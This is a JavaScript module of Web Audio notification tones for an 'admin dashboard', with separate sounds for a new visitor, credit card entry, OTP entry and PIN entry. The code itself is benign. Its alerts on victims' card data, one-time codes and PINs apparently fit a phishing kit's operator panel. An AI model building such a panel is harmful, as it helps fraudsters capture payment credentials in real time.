// Notification Sounds for Admin Dashboard

// Create audio context
const audioContext = typeof window !== 'undefined' ? new (window.AudioContext || window.webkitAudioContext)() : null;

/**
 * Play a beep sound for new visitor
 * Simple notification tone
 */
export const playNewVisitorSound = () => {
  if (!audioContext) return;
  
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.value = 800; // Hz
  oscillator.type = 'sine';
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.5);
  
  console.log('🔔 New visitor sound played');
};

/**
 * Play a special sound for credit card data entry
 * Two-tone alert sound
 */
export const playCardDataSound = () => {
  if (!audioContext) return;
  
  // First tone
  const oscillator1 = audioContext.createOscillator();
  const gainNode1 = audioContext.createGain();
  
  oscillator1.connect(gainNode1);
  gainNode1.connect(audioContext.destination);
  
  oscillator1.frequency.value = 1200; // Higher pitch
  oscillator1.type = 'sine';
  
  gainNode1.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode1.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
  
  oscillator1.start(audioContext.currentTime);
  oscillator1.stop(audioContext.currentTime + 0.3);
  
  // Second tone (delayed)
  const oscillator2 = audioContext.createOscillator();
  const gainNode2 = audioContext.createGain();
  
  oscillator2.connect(gainNode2);
  gainNode2.connect(audioContext.destination);
  
  oscillator2.frequency.value = 1000; // Slightly lower
  oscillator2.type = 'sine';
  
  gainNode2.gain.setValueAtTime(0.3, audioContext.currentTime + 0.35);
  gainNode2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.7);
  
  oscillator2.start(audioContext.currentTime + 0.35);
  oscillator2.stop(audioContext.currentTime + 0.7);
  
  console.log('💳 Card data sound played');
};

/**
 * Play a special sound for OTP entry
 * Triple beep pattern
 */
export const playOTPSound = () => {
  if (!audioContext) return;
  
  const beepTimes = [0, 0.2, 0.4];
  
  beepTimes.forEach((time, index) => {
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 1400;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.25, audioContext.currentTime + time);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + time + 0.15);
    
    oscillator.start(audioContext.currentTime + time);
    oscillator.stop(audioContext.currentTime + time + 0.15);
  });
  
  console.log('🔐 OTP sound played');
};

/**
 * Play a special sound for PIN entry
 * Deep double beep
 */
export const playPINSound = () => {
  if (!audioContext) return;
  
  const oscillator1 = audioContext.createOscillator();
  const gainNode1 = audioContext.createGain();
  
  oscillator1.connect(gainNode1);
  gainNode1.connect(audioContext.destination);
  
  oscillator1.frequency.value = 600; // Lower pitch
  oscillator1.type = 'square';
  
  gainNode1.gain.setValueAtTime(0.2, audioContext.currentTime);
  gainNode1.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.25);
  
  oscillator1.start(audioContext.currentTime);
  oscillator1.stop(audioContext.currentTime + 0.25);
  
  // Second beep
  const oscillator2 = audioContext.createOscillator();
  const gainNode2 = audioContext.createGain();
  
  oscillator2.connect(gainNode2);
  gainNode2.connect(audioContext.destination);
  
  oscillator2.frequency.value = 600;
  oscillator2.type = 'square';
  
  gainNode2.gain.setValueAtTime(0.2, audioContext.currentTime + 0.3);
  gainNode2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.55);
  
  oscillator2.start(audioContext.currentTime + 0.3);
  oscillator2.stop(audioContext.currentTime + 0.55);
  
  console.log('🔑 PIN sound played');
};

/**
 * Initialize audio context (must be called after user interaction)
 */
export const initAudioContext = () => {
  if (audioContext && audioContext.state === 'suspended') {
    audioContext.resume();
  }
};
